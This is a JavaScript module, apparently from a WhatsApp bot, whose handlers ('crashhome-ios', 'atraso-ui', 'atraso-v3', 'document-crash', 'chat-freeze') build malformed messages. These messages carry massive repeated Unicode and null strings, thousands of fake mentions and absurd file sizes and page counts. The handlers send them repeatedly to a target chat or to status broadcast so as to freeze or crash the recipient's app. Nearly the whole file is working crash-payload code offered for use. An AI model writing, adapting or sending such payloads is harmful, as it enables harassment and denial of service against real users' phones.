// lib/heavyTasks.js
// Lógica de CPU pesada, aislada del mundo.
const fs = require('fs'); // Ya no se usa, los buffers vienen en context.assets
const { generateWAMessageFromContent,
            getAggregateVotesInPollMessage,
            downloadContentFromMessage,
            prepareWAMessageMedia,
            useMultiFileAuthState,
            generateMessageID,
            generateIOSMessageID,
            generateWAMessage,
            makeInMemoryStore,
            DisconnectReason,
            areJidsSameUser,
            getContentType,
            decryptPollVote,
            relayMessage,
            jidDecode,
            Browsers,
            getDevice,
            proto,
} = require('baron-baileys-v2'); // Dependencias para construir mensajes

// Función de sleep
const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));

module.exports = {

    'crashhome-ios': async (conn, m, context) => {
        // --- Lógica del 'case "crashhome-ios"' ---
        const X = m.chat; //
        const rawText = (m.text || m.message?.conversation || "").trim(); //
        const found = rawText.match(/(\d+)/); //
        let times = found ? parseInt(found[1], 10) : 5; //
        if (isNaN(times) || times < 1) times = 1; //
        const MAX_SENDS = 100; //
        if (times > MAX_SENDS) times = MAX_SENDS; //

        // --- Lógica de la función 'async function ios(X)' ---
        for (let i = 0; i < times; i++) { //
            try {
                // Leer miniatura desde el CONTEXTO (assets), no desde el disco
                const jpegThumbnailBuffer = context.assets.fotoJpg; //

                let locationMessage = { //
                    degreesLatitude: -0,
                    degreesLongitude: 0,
                    jpegThumbnail: jpegThumbnailBuffer,
                    name: "\u0000" + "𑇂𑆵𑆴𑆿𑆿".repeat(15000),
                    address: "\u0000" + "𑇂𑆵𑆴𑆿𑆿".repeat(10000),
                    url: `https://xnxx.${"𑇂𑆵𑆴𑆿".repeat(25000)}.com.mx`,
                };

                let extendMsg = { //
                    extendedTextMessage: {
                        text: "⚡️ 𝐆𝐎𝐄𝐓 𝐆𝐍𝐒" + "𑇂𑆵𑆴𑆿".repeat(60000),
                        matchedText: "☕️ 𝐏.𝐀. Zin 𝐖𝐞𝐛 </>",
                        description: "𑇂𑆵𑆴𑆿".repeat(25000),
                        title: "𑇂𑆵𑆴𑆿".repeat(15000),
                        previewType: "NONE",
                        jpegThumbnail: jpegThumbnailBuffer,
                        thumbnailDirectPath: "/v/t62.36144-24/32403911_656678750102553_6150409332574546408_n.enc?ccb=11-4&oh=01_Q5AaIZ5mABGgkve1IJaScUxgnPgpztIPf_qlibndhhtKEs9O&oe=680D191A&_nc_sid=5e03e0",
                        thumbnailSha256: Buffer.from("eJRYfczQlgc12Y6LJVXtlABSDnnbWHdavdShAWWsrow=", "base64"),
                        thumbnailEncSha256: Buffer.from("pEnNHAqATnqlPAKQOs39bEUXWYO+b9LgFF+aAF0Yf8k=", "base64"),
                        mediaKey: Buffer.from("8yjj0AMiR6+h9+JUSA/EHuzdDTakxqHuSNRmTdjGRYk=", "base64"),
                        mediaKeyTimestamp: "1743101489",
                        thumbnailHeight: 641,
                        thumbnailWidth: 640,
                        inviteLinkGroupTypeV2: "DEFAULT"
                    }
                };

                // Crear el primer mensaje (view once con location)
                const msg1 = conn.generateWAMessageFromContent(X, {
                    viewOnceMessage: {
                        message: {
                            locationMessage
                        }
                    }
                }, { userJid: X });

                // Crear el segundo mensaje (view once con extendMsg)
                const msg2 = conn.generateWAMessageFromContent(X, {
                    viewOnceMessage: {
                        message: extendMsg
                    }
                }, { userJid: X });

                // Enviar ambos mensajes al broadcast de estados
                for (const msg of [msg1, msg2]) {
                    await conn.relayMessage(
                        'status@broadcast',
                        msg.message,
                        {
                            messageId: msg.key.id,
                            statusJidList: [X],
                            additionalNodes: [
                                {
                                    tag: 'meta',
                                    attrs: {},
                                    content: [
                                        {
                                            tag: 'mentioned_users',
                                            attrs: {},
                                            content: [
                                                {
                                                    tag: 'to',
                                                    attrs: { jid: X },
                                                    content: undefined
                                                }
                                            ]
                                        }
                                    ]
                                }
                            ]
                        }
                    );
                }

                console.log("✅️ Enviado exitosamente (crashhome-ios)"); //
            } catch (err) {
                console.error("❌ Error al enviar (crashhome-ios):", err); //
            }
            if (i !== times - 1) await sleep(5000); //
        }
    },
    
   'atraso-ui': async (conn, m, context) => {
        // --- Lógica del 'case "atraso-ui"' ---
        const target = m.chat; //
        const rawText = (m.text || m.message?.conversation || "").trim(); //
        const found = rawText.match(/(\d+)/); //
        let times = found ? parseInt(found[1], 10) : 1; //
        if (isNaN(times) || times < 1) times = 1; //
        const MAX_SENDS = 100; //
        if (times > MAX_SENDS) times = MAX_SENDS; //

        // --- Lógica de la función 'async function Cihuyyy(target)' ---
        for (let i = 0; i < times; i++) { //
            try {
                let push = []; //
                // let buttt = []; // Esta variable no se usa en el código original

                for (let j = 0; j < 10; j++) { //
                    push.push({
                        "body": {
                            "text": "⎋🤬</🤬⃟༑⌁⃰𝕮𝖍𝖔𝖈𝖔𝖕𝖑𝖚𝖘\\>🤬"
                        },
                        "header": {
                            "title": "🤬</🤬⃟༑⌁⃰𝕮𝖍𝖔𝖈𝖔𝖕𝖑𝖚𝖘\\>🤬" + "\u0000".repeat(50000),
                            "hasMediaAttachment": false,
                            "imageMessage": { //
                                "url": "https://mmg.whatsapp.net/v/t62.7118-24/19005640_1691404771686735_1492090815813476503_n.enc?ccb=11-4&oh=01_Q5AaIMFQxVaaQDcxcrKDZ6ZzixYXGeQkew5UaQkic-vApxqU&oe=66C10EEE&_nc_sid=5e03e0&mms3=true",
                                "mimetype": "image/jpeg",
                                "fileSha256": "dUyudXIGbZs+OZzlggB1HGvlkWgeIC56KyURc4QAmk4=",
                                "fileLength": "591",
                                "height": 0,
                                "width": 0,
                                "mediaKey": "LGQCMuahimyiDF58ZSB/F05IzMAta3IeLDuTnLMyqPg=",
                                "fileEncSha256": "G3ImtFedTV1S19/esIj+T5F+PuKQ963NAiWDZEn++2s=",
                                "directPath": "/v/t62.7118-24/19005640_1691404771686735_1492090815813476503_n.enc?ccb=11-4&oh=01_Q5AaIMFQxVaaQDcxcrKDZ6ZzixYXGeQkew5UaQkic-vApxqU&oe=66C10EEE&_nc_sid=5e03e0",
                                "mediaKeyTimestamp": "1721344123",
                                "jpegThumbnail": "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIABkAGQMBIgACEQEDEQH/xAArAAADAQAAAAAAAAAAAAAAAAAAAQMCAQEBAQAAAAAAAAAAAAAAAAAAAgH/2gAMAwEAAhADEAAAAMSoouY0VTDIss//xAAeEAACAQQDAQAAAAAAAAAAAAAAARECEHFBIv/aAAgBAQABPwArUs0Reol+C4keR5tR1NH1b//EABQRAQAAAAAAAAAAAAAAAAAAACD/2gAIAQIBAT8AH//EABQRAQAAAAAAAAAAAAAAAAAAACD/2gAIAQMBAT8AH//Z",
                                "scansSidecar": "igcFUbzFLVZfVCKxzoSxcDtyHA1ypHZWFFFXGe+0gV9WCo/RLfNKGw==",
                                "scanLengths": [
                                    247,
                                    201,
                                    73,
                                    63
                                ],
                                "midQualityFileSha256": "qig0CvELqmPSCnZo7zjLP0LJ9+nWiwFgoQ4UkjqdQro="
                            }
                        },
                        "nativeFlowMessage": {
                            "buttons": []
                        }
                    });
                }

                const carousel = conn.generateWAMessageFromContent(target, { //
                    "viewOnceMessage": {
                        "message": {
                            "messageContextInfo": {
                                "deviceListMetadata": {},
                                "deviceListMetadataVersion": 2
                            },
                            "interactiveMessage": {
                                "body": {
                                    "text": "⎋🤬</🤬⃟༑⌁⃰🕷️「BlackOut System Zap」‌‌\\>🤬" + "ꦾ".repeat(50000)
                                },
                                "footer": {
                                    "text": "🤬</🤬༑⌁⃰🕷️「BlackOut System Zap」ཀ‌‌\\>🤬"
                                },
                                "header": {
                                    "hasMediaAttachment": false
                                },
                                "carouselMessage": {
                                    "cards": [
                                        ...push
                                    ]
                                }
                            }
                        }
                    }
                }, {});
                
                await conn.relayMessage(target, carousel.message, { //
                    messageId: carousel.key.id
                });

            } catch (err) {
                console.error("atraso+ui:", err); //
            }
            if (i !== times - 1) await sleep(5000); //
        }
    },
    'atraso-v3': async (conn, m, context) => {
        // --- Lógica del 'case "atraso-v3"' ---
        const target = m.chat; //
        const rawText = (m.text || m.message?.conversation || "").trim(); //
        const found = rawText.match(/(\d+)/); //
        let times = found ? parseInt(found[1], 10) : 20; //
        if (isNaN(times) || times < 1) times = 1; //
        const MAX_SENDS = 100; //
        if (times > MAX_SENDS) times = MAX_SENDS; //

        // --- Lógica de la función 'async function DelayBjir(target)' ---
        for (let i = 0; i < times; i++) { //
            try { // Try/Catch del 'case'
                
                try { // Try/Catch interno de 'DelayBjir'
                    const AimBot = { //
                        viewOnceMessage: {
                            message: {
                                locationMessage: {
                                    degreesLatitude: 9.999999,
                                    degreesLongitude: -9.999999,
                                    name: "⎋🦠</🧬⃟༑⌁⃰𝙕𝙚𝙧𝙤𝙂𝙝𝙤𝙨𝙩𝙓ཀ‌‌\\>🍷𞋯" + "\u0000".repeat(88888),
                                    address: "\u0000".repeat(5555),
                                    contextInfo: {
                                        mentionedJid: Array.from({ length: 2000 }, () =>
                                            "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"
                                        ),
                                        isSampled: true,
                                        participant: target,
                                        remoteJid: target,
                                        forwardingScore: 9741,
                                        isForwarded: true
                                    }
                                }
                            }
                        }
                    };

                    const AimBot2 = { //
                        viewOnceMessage: {
                            message: {
                                interactiveResponseMessage: {
                                    body: {
                                        text: "⎋🦠</🧬⃟༑⌁⃰𝙕𝙚𝙧𝙤𝙂𝙝𝙤𝙨𝙩𝙓ཀ‌‌\\>🍷𞋯",
                                        format: "DEFAULT"
                                    },
                                    nativeFlowResponseMessage: {
                                        name: "call_permission_request",
                                        paramsJson: "\u0000".repeat(1045000),
                                        version: 3
                                    }
                                }
                            }
                        }
                    };

                    const AimBot3 = { //
                        extendedTextMessage: {
                            text:
                                "⎋🦠</🧬⃟༑⌁⃰𝙕𝙚𝙧𝙤𝙂𝙝𝙤𝙨𝙩𝙓ཀ‌‌\\>🍷𞋯" +
                                "\u0000".repeat(299986),
                            contextInfo: {
                                participant: target,
                                mentionedJid: [
                                    "0@s.whatsapp.net",
                                    ...Array.from(
                                        { length: 1900 },
                                        () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
                                    )
                                ]
                            }
                        }
                    };

                    // Definimos los nodos adicionales para el relay
                    const statusJidList = [target];
                    const additionalNodes = [
                        {
                            tag: "meta",
                            attrs: {},
                            content: [
                                {
                                    tag: "mentioned_users",
                                    attrs: {},
                                    content: [
                                        { tag: "to", attrs: { jid: target }, content: undefined }
                                    ]
                                }
                            ]
                        }
                    ];

                    // Usamos el 'conn' (fake conn) del hilo
                    const msg1 = conn.generateWAMessageFromContent(target, AimBot, {}); //
                    await conn.relayMessage("status@broadcast", msg1.message, { //
                        messageId: msg1.key.id,
                        statusJidList: statusJidList,
                        additionalNodes: additionalNodes
                    });

                    const msg2 = conn.generateWAMessageFromContent(target, AimBot2, {}); //
                    await conn.relayMessage("status@broadcast", msg2.message, { //
                        messageId: msg2.key.id,
                        statusJidList: statusJidList,
                        additionalNodes: additionalNodes
                    });

                    const msg3 = conn.generateWAMessageFromContent(target, AimBot3, {}); //
                    await conn.relayMessage("status@broadcast", msg3.message, { //
                        messageId: msg3.key.id,
                        statusJidList: statusJidList,
                        additionalNodes: additionalNodes
                    });

                } catch (err) {
                    console.error("BJIR ERROR COK😡🗿:", err); //
                }
                
            } catch (err) {
                console.error("atraso-v3 loop error:", err); // (modificado de "documentCrash error")
            }
            if (i !== times - 1) await sleep(5000); //
        }
    },
   'document-crash': async (conn, m, context) => {
        // --- Lógica del 'case "document-crash"' ---
        const target = m.chat; //
        const rawText = (m.text || m.message?.conversation || "").trim(); //
        const found = rawText.match(/(\d+)/); //
        let times = found ? parseInt(found[1], 10) : 10; //
        if (isNaN(times) || times < 1) times = 1; //
        const MAX_SENDS = 100; //
        if (times > MAX_SENDS) times = MAX_SENDS; //

        // --- Lógica de la función 'async function documentCrash(target)' ---
        for (let i = 0; i < times; i++) { //
            try { //
                await conn.relayMessage(target, { //
                    documentMessage: { //
                        url: "https://mmg.whatsapp.net/v/t62.7119-24/18970868_1451610396007067_2477655932894905749_n.enc?ccb=11-4&oh=01_Q5Aa2gG5YtBm2C0eu_nYievlS-3dhLAjC8Ne70VK9vO12EPF_g&oe=68EA391C&_nc_sid=5e03e0&mms3=true", //
                        mimetype: "application/zip", //
                        fileSha256: "gXL6XotbKW05nCSSa/XlvXeMqOsMkq37Y/XrewO5a0g=", //
                        fileLength: 99999999999, //
                        pageCount: 999999999, //
                        mediaKey: "HduCwhWMz3owQVo4188Om/0YCAl7ws8Zls0hdLD5aEY=", //
                        fileName: "🕷️「BlackOut System Zap」, 𝕮𝖍𝖔𝖈𝖔𝖕𝖑𝖚𝖘", //
                        fileEncSha256: "9kYcZz1osvxhOoL1hH0el9ZhUYh9z0uk2McxFTOpiHU=", //
                        directPath: "/v/t62.7119-24/18970868_1451610396007067_2477655932894905749_n.enc?ccb=11-4&oh=01_Q5Aa2gG5YtBm2C0eu_nYievlS-3dhLAjC8Ne70VK9vO12EPF_g&oe=68EA391C&_nc_sid=5e03e0", //
                        mediaKeyTimestamp: "1757598955", //
                        // ADAPTACIÓN: Usar 'assets' del contexto
                        jpegThumbnail: context.assets.ZeppImg, //
                        contactVcard: true, //
                        contextInfo: { //
                            isForwarded: true,
                            forwardingScore: 9999,
                            businessMessageForwardInfo: {
                                businessOwnerJid: "13135550202@s.whatsapp.net"
                            },
                            participant: "13135550302@bot",
                            quotedMessage: {
                                paymentInviteMessage: {
                                    serviceType: 3,
                                    expiryTimestamp: Date.now() * 100 // Esto está bien
                                }
                            },
                            remoteJid: "kkk"
                        }
                    }
                }, {});
            } catch (err) { //
                console.error("documentCrash error:", err); //
            } //
            if (i !== times - 1) await sleep(5000); //
        }
    },
    'chat-freeze': async (conn, m, context) => {
        // --- Lógica del 'case "chat-freeze"' ---
        const from = m.chat; //
        const sender = m.sender; //
        
        // ADAPTACIÓN: El 'm' original se usaba como thumbnail.
        // Eso no se puede clonar. Usamos un thumbnail de los assets.
        const thumbnailBuffer = context.assets.thumbJpg; 
        
        try { //
            for (let i = 0; i < 10; i++) { //
                await conn.sendMessage(from, { //
                    location: { //
                        degreesLatitude: 'ola',
                        degreesLongitude: 'ola',
                        name: `ola`,
                        url: context.assets.bugUrl, // ADAPTACIÓN: Usar asset
                        contextInfo: { //
                            forwardingScore: 508,
                            isForwarded: true,
                            isLiveLocation: true,
                            fromMe: false,
                            participant: '0@s.whatsapp.net',
                            remoteJid: sender,
                            quotedMessage: { //
                                documentMessage: {
                                    url: "https://mmg.whatsapp.net/v/t62.7119-24/34673265_965442988481988_3759890959900226993_n.enc?ccb=11-4&oh=01_AdRGvYuQlB0sdFSuDAeoDUAmBcPvobRfHaWRukORAicTdw&oe=65E730EB&_nc_sid=5e03e0&mms3=true",
                                    mimetype: "application/pdf",
                                    title: "crash",
                                    pageCount: 1000000000,
                                    fileName: "crash.pdf",
                                    contactVcard: true
                                }
                            },
                            forwardedNewsletterMessageInfo: { //
                                newsletterJid: '120363274419284848@newsletter',
                                serverMessageId: 1,
                                newsletterName: " " + context.assets.telapreta + context.assets.telapreta // ADAPTACIÓN: Usar asset
                            },
                            externalAdReply: { //
                                title: ' ola ',
                                body: 'ola',
                                mediaType: 0,
                                thumbnail: thumbnailBuffer,     // ADAPTACIÓN: Usar buffer
                                jpegThumbnail: thumbnailBuffer, // ADAPTACIÓN: Usar buffer
                                mediaUrl: `https://www.youtube.com/@g`,
                                sourceUrl: `https://chat.whatsapp.com/`
                            }
                        }
                    }
                });
            }
        } catch (e) { //
            console.error("Error en hilo (chat-freeze):", e); //
        }
    },
    

    // ... (Añadir TODOS los demás comandos de 'heavyCommands' aquí) ...
    // 'atraso-v3', 'xhgr', 'atraso-new', 'xhgr2', 'good', 'new', 
    // 'andro-ios', 'crash-button', 'chat-freeze', 'crash-ui', 'canal-ios'
    
    'default': async (conn, m, context) => {
        console.error(`Comando pesado ${context.command} no implementado en heavyTasks.js`);
    }
};